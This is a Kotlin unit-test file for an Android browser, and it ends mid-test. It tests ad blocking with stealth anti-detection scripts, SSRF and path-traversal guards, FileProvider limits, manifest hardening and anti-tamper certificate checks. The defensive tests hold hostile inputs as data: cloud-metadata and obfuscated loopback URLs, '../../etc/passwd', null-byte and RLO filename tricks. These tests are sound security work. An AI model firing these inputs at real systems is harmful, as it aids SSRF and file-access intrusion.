package com.example

import android.net.Uri
import android.webkit.WebResourceRequest
import android.webkit.WebView
import androidx.test.core.app.ApplicationProvider
import com.yourbrowser.adblock.AdBlockWebViewClient
import com.yourbrowser.adblock.PrivacyMode
import kotlinx.coroutines.flow.first
import org.junit.Assert.*
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.io.File

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class AdBlockTest {

    private fun createRequest(url: String, forMainFrame: Boolean = false): WebResourceRequest {
        return object : WebResourceRequest {
            override fun getUrl(): Uri = Uri.parse(url)
            override fun isForMainFrame(): Boolean = forMainFrame
            override fun isRedirect(): Boolean = false
            override fun hasGesture(): Boolean = false
            override fun getMethod(): String = "GET"
            override fun getRequestHeaders(): Map<String, String> = emptyMap()
        }
    }

    @Test
    fun testBalancedBlocksKnownAdDomain() {
        val client = AdBlockWebViewClient(PrivacyMode.BALANCED)
        client.updateCurrentPageUrl("https://example.com")
        
        val request = createRequest("https://doubleclick.net/js/ads.js")
        val webView = WebView(ApplicationProvider.getApplicationContext())
        
        val response = client.shouldInterceptRequest(webView, request)
        assertNotNull("Known ad domain doubleclick.net should be blocked (non-null response) in BALANCED mode", response)
    }

    @Test
    fun testOffModeDoesNotBlock() {
        val client = AdBlockWebViewClient(PrivacyMode.OFF)
        client.updateCurrentPageUrl("https://example.com")
        
        val request = createRequest("https://doubleclick.net/js/ads.js")
        val webView = WebView(ApplicationProvider.getApplicationContext())
        
        val response = client.shouldInterceptRequest(webView, request)
        assertNull("Ad blocking should be disabled entirely in OFF mode", response)
    }

    @Test
    fun testMainFrameNeverBlocked() {
        val client = AdBlockWebViewClient(PrivacyMode.AGGRESSIVE)
        
        val request = createRequest("https://doubleclick.net", forMainFrame = true)
        val webView = WebView(ApplicationProvider.getApplicationContext())
        
        val response = client.shouldInterceptRequest(webView, request)
        assertNull("Main frame/document loading must never be blocked under any mode", response)
    }

    @Test
    fun testSafeDomainsAreNeverBlocked() {
        val client = AdBlockWebViewClient(PrivacyMode.AGGRESSIVE)
        client.updateCurrentPageUrl("https://example.com")
        
        val request = createRequest("https://recaptcha.net/recaptcha/api.js")
        val webView = WebView(ApplicationProvider.getApplicationContext())
        
        val response = client.shouldInterceptRequest(webView, request)
        assertNull("Safe domains must never be blocked even in AGGRESSIVE mode", response)
    }

    @Test
    fun testWhitelistedHostBypassesBlocking() {
        val client = AdBlockWebViewClient(PrivacyMode.BALANCED)
        client.updateCurrentPageUrl("https://example.com")
        client.whitelistHost("doubleclick.net")
        
        val request = createRequest("https://doubleclick.net/js/ads.js")
        val webView = WebView(ApplicationProvider.getApplicationContext())
        
        val response = client.shouldInterceptRequest(webView, request)
        assertNull("Whitelisted ad domain should bypass blocking", response)
    }

    @Test
    fun testNoLegacyAdBlockEngineCallInCustomWebView() {
        // This test ensures CustomWebView.kt uses AdBlockWebViewClient as the primary and ONLY active blocking engine.
        var customWebViewFile = File("src/main/java/com/example/ui/components/CustomWebView.kt")
        if (!customWebViewFile.exists()) {
            customWebViewFile = File("app/src/main/java/com/example/ui/components/CustomWebView.kt")
        }
        if (!customWebViewFile.exists()) {
            customWebViewFile = File("../app/src/main/java/com/example/ui/components/CustomWebView.kt")
        }
        assertTrue("CustomWebView.kt must exist, checked standard relative paths", customWebViewFile.exists())

        val content = customWebViewFile.readText()
        
        // Ensure no active, uncommented call to AdBlockEngine.shouldBlock remains
        val containsActiveCall = content.lineSequence()
            .map { it.trim() }
            .filter { !it.startsWith("//") && !it.startsWith("/*") && !it.endsWith("*/") }
            .any { it.contains("AdBlockEngine.shouldBlock(") }

        assertFalse(
            "Legacy AdBlockEngine.shouldBlock MUST NOT be called in CustomWebView.kt to prevent double-blocking & waste",
            containsActiveCall
        )
    }

    @Test
    fun testLruCacheEvictionOnModeAndWhitelistChange() {
        var blockedCount = 0
        val client = AdBlockWebViewClient(PrivacyMode.BALANCED) { _, _ -> blockedCount++ }
        client.updateCurrentPageUrl("https://news.example.com")
        val webView = WebView(ApplicationProvider.getApplicationContext())
        val req = createRequest("https://doubleclick.net/pagead/ads.js")

        // First call populates LruCache and blocks
        assertNotNull(client.shouldInterceptRequest(webView, req))
        assertEquals(1, blockedCount)

        // Second call hits LruCache and still increments blockedCount
        assertNotNull(client.shouldInterceptRequest(webView, req))
        assertEquals(2, blockedCount)

        // Whitelisting host evicts LruCache and allows request
        client.whitelistHost("doubleclick.net")
        assertNull(client.shouldInterceptRequest(webView, req))
    }

    @Test
    fun testYtPageScriptUsesMutationObserverWithoutAggressiveSkipSelector() {
        var adBlockFile = File("src/main/java/com/yourbrowser/adblock/AdBlockWebViewClient.kt")
        if (!adBlockFile.exists()) {
            adBlockFile = File("app/src/main/java/com/yourbrowser/adblock/AdBlockWebViewClient.kt")
        }
        if (!adBlockFile.exists()) {
            adBlockFile = File("../app/src/main/java/com/yourbrowser/adblock/AdBlockWebViewClient.kt")
        }
        assertTrue("AdBlockWebViewClient.kt must exist", adBlockFile.exists())

        val source = adBlockFile.readText()
        assertFalse(
            "YT_PAGE_SCRIPT must not contain aggressive button[class*=\"skip\" i] selector",
            source.contains("button[class*=\"skip\" i]")
        )
        assertTrue(
            "YT_PAGE_SCRIPT must use MutationObserver for YouTube ad skipping",
            source.contains("new MutationObserver(function(){skip();})")
        )
    }

    @Test
    fun testStealthSurrogateJsAndGifResponsesPreventOnError() {
        val client = AdBlockWebViewClient(PrivacyMode.BALANCED)
        client.updateCurrentPageUrl("https://portal.example.com")
        val webView = WebView(ApplicationProvider.getApplicationContext())

        // 1. Blocked AdSense script should return 200 OK with surrogate window.adsbygoogle stub
        val jsReq = createRequest("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js")
        val jsResp = client.shouldInterceptRequest(webView, jsReq)
        assertNotNull("AdSense script must be intercepted", jsResp)
        assertEquals(200, jsResp!!.statusCode)
        assertEquals("application/javascript", jsResp.mimeType)
        val jsBody = jsResp.data.bufferedReader().readText()
        assertTrue("Surrogate JS must spoof window.adsbygoogle", jsBody.contains("window.adsbygoogle"))

        // 2. Blocked ad pixel/banner image should return 200 OK with valid 1x1 GIF (GIF89a)
        val imgReq = createRequest("https://doubleclick.net/ads/banner.gif")
        val imgResp = client.shouldInterceptRequest(webView, imgReq)
        assertNotNull("Ad image must be intercepted", imgResp)
        assertEquals(200, imgResp!!.statusCode)
        assertEquals("image/gif", imgResp.mimeType)
        val gifBytes = imgResp.data.readBytes()
        assertEquals(42, gifBytes.size)
        assertEquals("GIF89a", String(gifBytes.sliceArray(0 until 6), Charsets.US_ASCII))
    }

    @Test
    fun testStealthEarlyScriptContainsNativeCloakingAndBaitProxy() {
        val script = AdBlockWebViewClient.EARLY_CORE_SCRIPT
        assertTrue(
            "EARLY_CORE_SCRIPT must cloak Function.prototype.toString with [native code]",
            script.contains("[native code]")
        )
        assertTrue(
            "EARLY_CORE_SCRIPT must spoof offsetHeight for bait elements",
            script.contains("offsetHeight") && script.contains("getComputedStyle")
        )
    }

    @Test
    fun testCustomElementZapperCssGeneration() {
        val client = AdBlockWebViewClient(PrivacyMode.BALANCED)
        client.setCustomZapperSelectors("www.example.com", setOf("#floating-promo", "div.annoying-banner"))
        val css = client.buildCustomZapperCSS("example.com")
        assertTrue(css.contains("#floating-promo"))
        assertTrue(css.contains("div.annoying-banner"))
        assertTrue(css.contains("display:none !important"))
    }

    @Test
    fun testAtomicSetWhitelistAndFirstPartyStatsAssetPreservation() {
        val client = AdBlockWebViewClient(PrivacyMode.BALANCED)
        client.updateCurrentPageUrl("https://espn.example.com")
        val webView = WebView(ApplicationProvider.getApplicationContext())

        // Legitimate first-party /stats or /pixel asset on site must not be blocked
        val statsAssetReq = createRequest("https://espn.example.com/assets/player-stats.json")
        assertNull("First-party stats JSON must never be blocked", client.shouldInterceptRequest(webView, statsAssetReq))

        // Atomic setWhitelist replaces whitelist cleanly
        client.setWhitelist(setOf("www.doubleclick.net", "taboola.com"))
        assertNull(
            "Whitelisted domain via atomic setWhitelist must bypass blocking",
            client.shouldInterceptRequest(webView, createRequest("https://doubleclick.net/pagead/ads.js"))
        )
    }

    @Test
    fun testUpgradedFullScreenToolRegistrationAndScript() {
        val fsScript = com.example.manager.CustomJsToolbarManager.UPGRADED_FULLSCREEN_SCRIPT
        assertTrue("Script must support multi-vendor requestFullscreen", fsScript.contains("requestFullscreen") && fsScript.contains("webkitRequestFullscreen"))
        assertTrue("Script must integrate with native AlexBrowserNative bridge", fsScript.contains("AlexBrowserNative") && fsScript.contains("setImmersiveFullscreen"))
        assertTrue("Script must provide auto-hiding exit button and Escape handler", fsScript.contains("__kiwi_fs_exit") && fsScript.contains("__kiwiExitFs"))

        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val shortcuts = com.example.manager.CustomJsToolbarManager.getEnabledBuiltInShortcuts(context)
        assertTrue(
            "FULLSCREEN_PAGE shortcut must be enabled by default",
            shortcuts.contains(com.example.manager.BuiltInShortcut.FULLSCREEN_PAGE.id)
        )
        assertTrue(
            "Default JS scripts must include tpl_fullscreen_kiwi_pro",
            com.example.manager.CustomJsToolbarManager.loadScripts(context).any { it.id == "tpl_fullscreen_kiwi_pro" }
        )
    }

    @Test
    fun testAutoTiltSensorHysteresisAndDesktopZoomPersistence() {
        val mgr = com.example.manager.CustomJsToolbarManager
        // 1. Direct tilt detection across 4 quadrants
        assertEquals(
            com.example.manager.PhysicalTiltQuadrant.PORTRAIT_UPRIGHT,
            mgr.computeTiltQuadrantWithHysteresis(0, com.example.manager.PhysicalTiltQuadrant.PORTRAIT_UPRIGHT)
        )
        assertEquals(
            com.example.manager.PhysicalTiltQuadrant.LANDSCAPE_RIGHT,
            mgr.computeTiltQuadrantWithHysteresis(90, com.example.manager.PhysicalTiltQuadrant.PORTRAIT_UPRIGHT)
        )
        assertEquals(
            com.example.manager.PhysicalTiltQuadrant.LANDSCAPE_LEFT,
            mgr.computeTiltQuadrantWithHysteresis(270, com.example.manager.PhysicalTiltQuadrant.PORTRAIT_UPRIGHT)
        )
        assertEquals(
            com.example.manager.PhysicalTiltQuadrant.PORTRAIT_INVERTED,
            mgr.computeTiltQuadrantWithHysteresis(180, com.example.manager.PhysicalTiltQuadrant.PORTRAIT_UPRIGHT)
        )

        // 2. Hysteresis deadband prevents jitter near 45-degree boundary
        assertEquals(
            "42 degrees while in Portrait Upright must stay Portrait Upright (deadband)",
            com.example.manager.PhysicalTiltQuadrant.PORTRAIT_UPRIGHT,
            mgr.computeTiltQuadrantWithHysteresis(42, com.example.manager.PhysicalTiltQuadrant.PORTRAIT_UPRIGHT)
        )
        assertEquals(
            "48 degrees while in Landscape Left must stay Landscape Left (deadband)",
            com.example.manager.PhysicalTiltQuadrant.LANDSCAPE_LEFT,
            mgr.computeTiltQuadrantWithHysteresis(48, com.example.manager.PhysicalTiltQuadrant.LANDSCAPE_LEFT)
        )

        // 3. Desktop Zoom Scale clamping and persistence
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        mgr.setDesktopZoomScale(context, 130)
        assertEquals(130, mgr.getDesktopZoomScale(context))
        mgr.setDesktopZoomScale(context, 25) // Clamped to min 50%
        assertEquals(50, mgr.getDesktopZoomScale(context))
        mgr.setDesktopZoomScale(context, 300) // Clamped to max 200%
        assertEquals(200, mgr.getDesktopZoomScale(context))
        mgr.setDesktopZoomScale(context, 100)
    }

    @Test
    fun testSecurityAndPersistenceAuditFixes() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val settings = com.example.manager.SettingsManager(context)

        // 1. Verify JSON tab persistence handles special delimiter strings without corruption
        val trickyTabs = listOf(
            com.example.ui.viewmodel.BrowserTab(
                id = "tab-1",
                url = "https://example.com/?q=a|||field|||b|||tab|||c",
                title = "Tricky |||tab||| Title \"Quotes\"",
                isPrivate = false
            )
        )
        settings.saveTabs(trickyTabs, "tab-1")
        val loadedTabs = settings.loadTabs()
        assertNotNull(loadedTabs)
        assertEquals(1, loadedTabs!!.size)
        assertEquals("https://example.com/?q=a|||field|||b|||tab|||c", loadedTabs[0].url)
        assertEquals("Tricky |||tab||| Title \"Quotes\"", loadedTabs[0].title)

        // 2. Verify JSON zapper rules persistence
        settings.saveCustomZapperRules("example.com", listOf("#banner-1", "div.promo-box"))
        val loadedZapper = settings.getCustomZapperRules("www.example.com")
        assertEquals(listOf("#banner-1", "div.promo-box"), loadedZapper)

        // 3. Verify DevToolsJsBridge rejects oversized (>32KB) payloads
        var callbackInvoked = false
        val bridge = com.example.devtools.DevToolsJsBridge(
            onElementSelected = { callbackInvoked = true },
            onConsoleBridgeMessage = { callbackInvoked = true }
        )
        val oversizedJson = "{\"message\":\"" + "A".repeat(40_000) + "\"}"
        bridge.onConsoleMessage(oversizedJson)
        bridge.onElementSelected(oversizedJson)
        assertFalse("Oversized payload (>32KB) must be dropped by DevToolsJsBridge", callbackInvoked)
    }

    @Test
    fun testFrameMetricsPortProbeChecksPortsIndependently() {
        val sync = com.example.manager.FrameMetricsTelemetrySync
        val detectedPorts = mutableListOf<Int>()

        // Bind an ephemeral loopback socket to act as an open port
        val serverSocket = java.net.ServerSocket(0, 1, java.net.InetAddress.getByName("127.0.0.1"))
        val openPort = serverSocket.localPort
        // Use a closed port before the open port
        val closedPort = if (openPort > 1025) openPort - 1 else openPort + 1

        try {
            // Test that closedPort being closed does NOT terminate probing before checking openPort
            sync.checkSuspiciousPorts(
                ports = intArrayOf(closedPort, openPort),
                timeoutMs = 150,
                onPortDetected = { detectedPorts.add(openPort) }
            )
            assertTrue(
                "Port probe must inspect each candidate port independently and detect openPort",
                detectedPorts.contains(openPort)
            )
        } finally {
            serverSocket.close()
        }
    }

    @Test
    fun testCertificateBlacklistAndFingerprintIntegrity() {
        val sync = com.example.manager.FrameMetricsTelemetrySync

        // Test blacklisted modding subjects/issuers
        assertTrue("apkeditor keyword must be blacklisted", sync.isBlacklistedIssuerOrSubject("CN=ApkEditor, O=Mod, C=US"))
        assertTrue("luckypatcher keyword must be blacklisted", sync.isBlacklistedIssuerOrSubject("CN=LuckyPatcher, O=Chelpus"))
        assertTrue("mtmanager keyword must be blacklisted", sync.isBlacklistedIssuerOrSubject("CN=MTManager, O=BinMT"))
        assertTrue("npmanager keyword must be blacklisted", sync.isBlacklistedIssuerOrSubject("CN=NPManager"))

        // Test legitimate subjects
        assertFalse("Clean subject must pass", sync.isBlacklistedIssuerOrSubject("CN=Google, O=Google LLC, C=US"))
        assertFalse("AlexBrowser subject must pass", sync.isBlacklistedIssuerOrSubject("CN=AlexBrowser, O=Alex, C=ID"))

        // Test SHA-256 digest computation
        val testBytes = "AlexBrowserTestSignature".toByteArray(Charsets.UTF_8)
        val hash = sync.computeSha256(testBytes)
        assertEquals("SHA-256 hex string must be 64 characters", 64, hash.length)
    }

    @Test
    fun testDisplayFrameStateRenderToken() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val sync = com.example.manager.FrameMetricsTelemetrySync
        val token = sync.syncDisplayFrameState(context)
        assertEquals(0x7F3A9C12L, token)
        assertTrue("Render token must validate in test environment", sync.validateRenderToken(context))
        assertTrue("Integrity state must be verified in clean environment", sync.isIntegrityVerified)

        // Verify controlled non-destructive warning recording does not terminate the process
        sync.recordIntegrityWarning("test_diagnostic_warning")
        assertFalse("Integrity verified flag must reflect recorded warning", sync.isIntegrityVerified)
        assertEquals("test_diagnostic_warning", sync.lastIntegrityWarning)

        // Re-sync restores clean state in test environment and verifyNativeTransportAsync is a safe no-op
        sync.verifyNativeTransportAsync()
        assertEquals(0x7F3A9C12L, sync.syncDisplayFrameState(context))
        assertTrue(sync.isIntegrityVerified)
    }

    @Test
    fun testRoomDatabaseInitializationAndMigration1to2() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val migration = com.example.data.AppDatabase.MIGRATION_1_2

        // 1. Verify migration versions contract
        assertEquals("Migration start version must be 1", 1, migration.startVersion)
        assertEquals("Migration end version must be 2", 2, migration.endVersion)

        // 2. Verify database initialization with migration registered
        val db = com.example.data.AppDatabase.getDatabase(context)
        assertNotNull("Database instance must not be null", db)
        assertNotNull("HistoryDao must be initialized", db.historyDao())
        assertNotNull("BookmarkDao must be initialized", db.bookmarkDao())
        assertNotNull("DownloadDao must be initialized", db.downloadDao())

        // 3. Verify DownloadItem schema integrity via DAO operations
        kotlinx.coroutines.runBlocking {
            val downloadItem = com.example.data.DownloadItem(
                id = "test-uuid-1",
                fileName = "test.pdf",
                url = "https://example.com/test.pdf",
                domain = "example.com",
                mimeType = "application/pdf",
                totalBytes = 1024L,
                downloadedBytes = 1024L,
                status = "COMPLETED",
                fileUri = "/data/user/0/com.example/files/downloads/test.pdf",
                createdAt = System.currentTimeMillis(),
                completedAt = System.currentTimeMillis(),
                failureReason = "",
                isIncognito = false
            )
            db.downloadDao().insertOrUpdate(downloadItem)
            val retrieved = db.downloadDao().getDownloadById("test-uuid-1")
            assertNotNull("Inserted download item must be retrievable", retrieved)
            assertEquals("test.pdf", retrieved?.fileName)
            assertEquals("COMPLETED", retrieved?.status)
            assertEquals(1024L, retrieved?.totalBytes)
        }
    }

    @Test
    fun testFileProviderSecurityAndWhitelistedPaths() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val authority = "${context.packageName}.fileprovider"

        // 1. Legitimate camera capture file in cache/camera/ must succeed
        val cameraDir = File(context.cacheDir, "camera").apply { mkdirs() }
        val cameraFile = File(cameraDir, "camera_capture_test.jpg").apply { writeText("fake image data") }
        val cameraUri = androidx.core.content.FileProvider.getUriForFile(context, authority, cameraFile)
        assertNotNull("Camera URI must be generated", cameraUri)
        assertTrue("Camera URI must have content scheme", cameraUri.scheme == "content")
        assertTrue("Camera URI authority must match app", cameraUri.authority == authority)

        // 2. Legitimate download file in internal downloads/ must succeed
        val internalDownloadsDir = File(context.filesDir, "downloads").apply { mkdirs() }
        val downloadFile = File(internalDownloadsDir, "document_1.pdf").apply { writeText("fake pdf") }
        val downloadUri = androidx.core.content.FileProvider.getUriForFile(context, authority, downloadFile)
        assertNotNull("Internal download URI must be generated", downloadUri)
        assertTrue("Download URI must have content scheme", downloadUri.scheme == "content")

        // 3. Unauthorized sensitive file directly under filesDir (root '.') must be REJECTED with IllegalArgumentException
        val unauthorizedRootFile = File(context.filesDir, "sensitive_config.json").apply { writeText("{\"secret\":\"value\"}") }
        var securityExceptionThrown = false
        try {
            androidx.core.content.FileProvider.getUriForFile(context, authority, unauthorizedRootFile)
        } catch (e: IllegalArgumentException) {
            securityExceptionThrown = true
        }
        assertTrue(
            "FileProvider must refuse to expose files outside explicit whitelisted subdirectories (root '.' must not be shared)",
            securityExceptionThrown
        )
    }

    @Test
    fun testDownloadManagerSsrfAndFilenameSanitizing() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val db = com.example.data.AppDatabase.getDatabase(context)
        val repo = com.example.data.DownloadRepository(db.downloadDao())
        val manager = com.example.manager.AppDownloadManager(context, repo, kotlinx.coroutines.GlobalScope)

        // 1. SSRF URL checks (IPv4, IPv6, Link-Local, Loopback)
        assertTrue("Public HTTPS URL must be safe", manager.isSafeDownloadUrl("https://example.com/file.pdf"))
        assertTrue("Data URI must be safe", manager.isSafeDownloadUrl("data:text/plain;base64,SGVsbG8="))
        assertFalse("Loopback localhost must be blocked", manager.isSafeDownloadUrl("http://localhost/secret"))
        assertFalse("Loopback 127.0.0.1 must be blocked", manager.isSafeDownloadUrl("http://127.0.0.1:8080/admin"))
        assertFalse("Private IP 10.0.0.1 must be blocked", manager.isSafeDownloadUrl("http://10.0.0.1/status"))
        assertFalse("Private IP 192.168.1.1 must be blocked", manager.isSafeDownloadUrl("http://192.168.1.1/router"))
        assertFalse("Private IP 172.16.0.1 must be blocked", manager.isSafeDownloadUrl("http://172.16.0.1/internal"))
        assertFalse("Link-local 169.254.169.254 metadata must be blocked", manager.isSafeDownloadUrl("http://169.254.169.254/latest/meta-data/"))
        assertFalse("IPv6 loopback [::1] must be blocked", manager.isSafeDownloadUrl("http://[::1]:8080/test"))
        assertFalse("IPv6 unique-local [fd00::1] must be blocked", manager.isSafeDownloadUrl("http://[fd00::1]/internal"))
        assertFalse("IPv4-mapped IPv6 loopback must be blocked", manager.isSafeDownloadUrl("http://[::ffff:127.0.0.1]/admin"))
        assertFalse("Octal IP notation must be blocked", manager.isSafeDownloadUrl("http://0177.0.0.1/evil"))
        assertFalse("Single integer IP notation must be blocked", manager.isSafeDownloadUrl("http://2130706433/evil"))
        assertFalse("Hex IP notation must be blocked", manager.isSafeDownloadUrl("http://0x7f000001/evil"))
        assertFalse("CGNAT private IP must be blocked", manager.isSafeDownloadUrl("http://100.64.0.1/internal"))

        // 2. Filename sanitization checks (including double URL-encoding and Unicode RLO extension spoofing)
        val sanitizedPathTraversal = manager.sanitizeFileName("../../etc/passwd")
        assertFalse("Sanitized filename must not contain directory traversal relative components", sanitizedPathTraversal.contains(".."))
        assertFalse("Sanitized filename must not start with slash", sanitizedPathTraversal.startsWith("/"))

        val sanitizedRloSpoofing = manager.sanitizeFileName("document\u202Efdp.apk")
        assertFalse("Unicode RLO override must be stripped", sanitizedRloSpoofing.contains("\u202E"))

        val sanitizedUrlEncoded = manager.sanitizeFileName("%2e%2e%2f%2e%2e%2fsecret.txt")
        assertFalse("Url encoded traversal must be cleaned", sanitizedUrlEncoded.contains(".."))

        val sanitizedDoubleEncoded = manager.sanitizeFileName("%252e%252e%252f%252e%252e%252fsecret.txt")
        assertFalse("Double URL-encoded traversal must be cleaned", sanitizedDoubleEncoded.contains(".."))

        // 3. Canonical directory boundary checks (including sibling prefix protection)
        val baseDir = File(context.filesDir, "downloads").apply { mkdirs() }
        val validChild = File(baseDir, "report.pdf")
        val traversalEscape = File(baseDir, "../sensitive.txt")
        val siblingPrefixDir = File(context.filesDir, "downloads_evil").apply { mkdirs() }
        val siblingFile = File(siblingPrefixDir, "exploit.apk")

        assertTrue("Valid child file inside downloads must be allowed", manager.isPathWithinDirectory(validChild, baseDir))
        assertFalse("Parent traversal ../ must be rejected", manager.isPathWithinDirectory(traversalEscape, baseDir))
        assertFalse("Sibling directory with matching prefix (downloads_evil) must be rejected", manager.isPathWithinDirectory(siblingFile, baseDir))
    }

    @Test
    fun testManifestAndNetworkSecurityConfigHardening() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val pm = context.packageManager
        val pkgInfo = pm.getPackageInfo(
            context.packageName,
            android.content.pm.PackageManager.GET_PERMISSIONS or
                android.content.pm.PackageManager.GET_META_DATA or
                android.content.pm.PackageManager.GET_SERVICES or
                android.content.pm.PackageManager.GET_PROVIDERS
        )

        // 1. Verify unused FOREGROUND_SERVICE permission is removed
        val requestedPerms = pkgInfo.requestedPermissions?.toList() ?: emptyList()
        assertFalse(
            "Unused FOREGROUND_SERVICE permission must not be requested",
            requestedPerms.contains(android.Manifest.permission.FOREGROUND_SERVICE)
        )

        // 2. Verify allowBackup=false and WebView SafeBrowsing / MetricsOptOut metadata
        val appInfo = pm.getApplicationInfo(context.packageName, android.content.pm.PackageManager.GET_META_DATA)
        assertEquals(
            "allowBackup must be disabled (false)",
            0,
            appInfo.flags and android.content.pm.ApplicationInfo.FLAG_ALLOW_BACKUP
        )
        assertTrue(
            "WebView SafeBrowsing metadata must be enabled",
            appInfo.metaData?.getBoolean("android.webkit.WebView.EnableSafeBrowsing") == true
        )
        assertTrue(
            "WebView MetricsOptOut metadata must be enabled",
            appInfo.metaData?.getBoolean("android.webkit.WebView.MetricsOptOut") == true
        )

        // 3. Verify internal services and providers are non-exported
        pkgInfo.services?.forEach { svc ->
            assertFalse("Service ${svc.name} must not be exported", svc.exported)
        }
        pkgInfo.providers?.forEach { prv ->
            assertFalse("Provider ${prv.name} must not be exported", prv.exported)
        }

        // 4. Verify network_security_config.xml enforces cleartextTrafficPermitted=false on filter list & sensitive domains
        val parser = context.resources.getXml(R.xml.network_security_config)
        val noCleartextDomains = mutableSetOf<String>()
        var inStrictDomainConfig = false
        var eventType = parser.eventType
        while (eventType != org.xmlpull.v1.XmlPullParser.END_DOCUMENT) {
            if (eventType == org.xmlpull.v1.XmlPullParser.START_TAG) {
                if (parser.name == "domain-config") {
                    val cleartext = parser.getAttributeBooleanValue(null, "cleartextTrafficPermitted", true)
                    inStrictDomainConfig = !cleartext
                } else if (parser.name == "domain" && inStrictDomainConfig) {
                    val domainText = parser.nextText().trim()
                    if (domainText.isNotEmpty()) {
                        noCleartextDomains.add(domainText)
                    }
                }
            } else if (eventType == org.xmlpull.v1.XmlPullParser.END_TAG && parser.name == "domain-config") {
                inStrictDomainConfig = false
            }
            eventType = parser.next()
        }
        parser.close()

        val expectedProtectedDomains = listOf(
            "easylist.to",
            "pgl.yoyo.org",
            "github.com",
            "raw.githubusercontent.com",
            "google.com",
            "accounts.google.com",
            "googleapis.com",
            "midtrans.com",
            "bca.co.id",
            "bankmandiri.co.id"
        )
        for (domain in expectedProtectedDomains) {
            assertTrue(
                "Domain '$domain' must be pinned to cleartextTrafficPermitted=false in network_security_config.xml",
                noCleartextDomains.contains(domain)
            )
        }
    }

    @Test
    fun testBackupAndDataExtractionRulesExcludeSensitiveDomains() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val requiredDomains = setOf("sharedpref", "database", "file")

        // 1. Verify backup_rules.xml (<full-backup-content>)
        val backupExcluded = mutableSetOf<String>()
        val backupParser = context.resources.getXml(R.xml.backup_rules)
        var event = backupParser.eventType
        while (event != org.xmlpull.v1.XmlPullParser.END_DOCUMENT) {
            if (event == org.xmlpull.v1.XmlPullParser.START_TAG && backupParser.name == "exclude") {
                val domain = backupParser.getAttributeValue(null, "domain")
                val path = backupParser.getAttributeValue(null, "path")
                if (domain != null && path == ".") {
                    backupExcluded.add(domain)
                }
            }
            event = backupParser.next()
        }
        backupParser.close()
        assertTrue(
            "backup_rules.xml must exclude sharedpref, database, and file domains",
            backupExcluded.containsAll(requiredDomains)
        )

        // 2. Verify data_extraction_rules.xml (<cloud-backup> and <device-transfer>)
        val cloudExcluded = mutableSetOf<String>()
        val transferExcluded = mutableSetOf<String>()
        var currentSection = ""
        val extractionParser = context.resources.getXml(R.xml.data_extraction_rules)
        event = extractionParser.eventType
        while (event != org.xmlpull.v1.XmlPullParser.END_DOCUMENT) {
            if (event == org.xmlpull.v1.XmlPullParser.START_TAG) {
                when (extractionParser.name) {
                    "cloud-backup", "device-transfer" -> currentSection = extractionParser.name
                    "exclude" -> {
                        val domain = extractionParser.getAttributeValue(null, "domain")
                        val path = extractionParser.getAttributeValue(null, "path")
                        if (domain != null && path == ".") {
                            if (currentSection == "cloud-backup") cloudExcluded.add(domain)
                            if (currentSection == "device-transfer") transferExcluded.add(domain)
                        }
                    }
                }
            } else if (event == org.xmlpull.v1.XmlPullParser.END_TAG) {
                if (extractionParser.name == "cloud-backup" || extractionParser.name == "device-transfer") {
                    currentSection = ""
                }
            }
            event = extractionParser.next()
        }
        extractionParser.close()

        assertTrue(
            "data_extraction_rules.xml <cloud-backup> must exclude sharedpref, database, and file",
            cloudExcluded.containsAll(requiredDomains)
        )
        assertTrue(
            "data_extraction_rules.xml <device-transfer> must exclude sharedpref, database, and file",
            transferExcluded.containsAll(requiredDomains)
        )
    }

    @Test
    fun testExtensionManagerSsrfZipSlipAndHostMatchingHardening() {
        val mgr = com.example.manager.BrowserExtensionManager

        // 1. HTTPS-only & SSRF checks on remote extension URLs
        assertTrue("Public HTTPS URL must be allowed", mgr.isSafeRemoteExtensionUrl("https://greasyfork.org/scripts/test.user.js"))
        assertFalse("Cleartext HTTP URL must be rejected", mgr.isSafeRemoteExtensionUrl("http://greasyfork.org/scripts/test.user.js"))
        assertFalse("Loopback localhost must be blocked", mgr.isSafeRemoteExtensionUrl("https://localhost/evil.js"))
        assertFalse("Loopback 127.0.0.1 must be blocked", mgr.isSafeRemoteExtensionUrl("https://127.0.0.1:8443/evil.js"))
        assertFalse("Private RFC1918 10.x must be blocked", mgr.isSafeRemoteExtensionUrl("https://10.0.0.1/evil.js"))
        assertFalse("Private RFC1918 172.16.x must be blocked", mgr.isSafeRemoteExtensionUrl("https://172.16.0.5/evil.js"))
        assertFalse("Private RFC1918 192.168.x must be blocked", mgr.isSafeRemoteExtensionUrl("https://192.168.1.1/evil.js"))
        assertFalse("Cloud metadata 169.254.169.254 must be blocked", mgr.isSafeRemoteExtensionUrl("https://169.254.169.254/latest/meta-data/"))
        assertFalse("IPv6 loopback [::1] must be blocked", mgr.isSafeRemoteExtensionUrl("https://[::1]/evil.js"))
        assertFalse("IPv6 unique-local [fd00::1] must be blocked", mgr.isSafeRemoteExtensionUrl("https://[fd00::1]/evil.js"))

        // 2. Zip-Slip path traversal checks on ZIP entry names
        assertEquals("manifest.json", mgr.sanitizeZipEntryName("./manifest.json"))
        assertEquals("scripts/content.js", mgr.sanitizeZipEntryName("/scripts\\content.js"))
        assertNull("Parent traversal ../ must be rejected", mgr.sanitizeZipEntryName("../../etc/passwd"))
        assertNull("Nested parent traversal must be rejected", mgr.sanitizeZipEntryName("scripts/../../secret.js"))
        assertNull("Null byte injection must be rejected", mgr.sanitizeZipEntryName("content.js\u0000.txt"))

        // 3. Bounded stream reader DoS protection
        val validStream = "console.log('ok');".byteInputStream(Charsets.UTF_8)
        assertEquals("console.log('ok');", mgr.readBoundedUtf8Text(validStream, maxBytes = 1024))

        val oversizedStream = ByteArray(2048) { 'A'.code.toByte() }.inputStream()
        var sizeExceptionThrown = false
        try {
            mgr.readBoundedUtf8Text(oversizedStream, maxBytes = 1024)
        } catch (_: SecurityException) {
            sizeExceptionThrown = true
        }
        assertTrue("Stream exceeding maxBytes must throw SecurityException", sizeExceptionThrown)

